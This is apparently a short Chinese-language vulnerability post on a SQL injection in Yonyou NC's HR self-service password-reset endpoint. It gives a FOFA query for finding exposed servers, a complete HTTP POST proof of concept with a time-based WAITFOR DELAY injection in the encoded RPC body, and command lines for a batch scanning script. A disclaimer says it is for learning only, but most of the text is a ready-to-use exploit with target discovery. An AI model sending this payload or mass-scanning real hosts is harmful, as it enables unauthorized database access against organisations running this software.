# 用友NC  存在sql注入\

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa："NCCloud"

POC:

POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
Host: 192.168.100.1:8091
Pragma: no-cache
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.100.1:8091
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
Referer: http://192.168.100.1:8091/hrss/ResetPwd.jsp
Cookie: JSESSIONID=C2CFFE1429FF812ABF357C2BDD5BDBC1.server; JSESSIONID=8FEF31DBA1E3188706B14123C6D1CE87.server
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Length: 672

__type=updateData&__viewInstanceId=nc.bs.hrss.login.ResetPassword~nc.bs.hrss.login.ResetPasswordViewModel&__xml=%3Crpc%20transaction%3D%2210%22%20method%3D%22resetPwd%22%3E%3Cdef%3E%3Cdataset%20type%3D%22Custom%22%20id%3D%22dsResetPwd%22%3E%3Cf%20name%3D%22user%22%3E%3C/f%3E%3Cf%20name%3D%22ID%22%3E%3C/f%3E%3C/dataset%3E%3C/def%3E%3Cdata%3E%3Crs%20dataset%3D%22dsResetPwd%22%3E%3Cr%20id%3D%2210009%22%20state%3D%22insert%22%3E%3Cn%3E%3Cv%3E1';WAITFOR DELAY '0:0:6'--%3C/v%3E%3Cv%3E11111111111111111111%3C/v%3E%3C/n%3E%3C/r%3E%3C/rs%3E%3C/data%3E%3Cvps%3E%3Cp%20name%3D%22__profileKeys%22%3EfindPwd%253B15b021628b8411d33569071324dc1b37%3C/p%3E%3C/vps%3E%3C/rpc%3E&1700109885028





批量poc(记得安装库)

python poc.py -u 



python poc.py -f  .txt

